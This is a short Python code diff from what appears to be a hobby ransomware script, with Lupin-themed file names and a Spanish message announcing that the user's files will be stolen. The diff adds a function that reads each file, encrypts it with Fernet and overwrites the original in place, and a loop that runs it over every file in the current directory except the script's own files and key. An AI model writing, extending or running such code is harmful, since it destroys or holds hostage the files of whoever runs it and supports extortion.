@@ -7,6 +7,14 @@ from cryptography.fernet import Fernet
 print ("Todo sus archivos van a ser robados")
 Archivos_obj=[]
 
+def encriptar_archivo(nombre_archivo,llave):
+    with open(nombre_archivo,"rb") as archivo:
+        contenido = archivo.read()
+    encriptado = Fernet(llave).encrypt(contenido)
+    with open(nombre_archivo,"wb") as archivo_encrypt:
+        archivo_encrypt.write(encriptado)
+
+
 for archivo in os.listdir():
     if archivo =="Lupin.py" or archivo=="laLLave.key" or archivo=="ganimard.py":
         continue
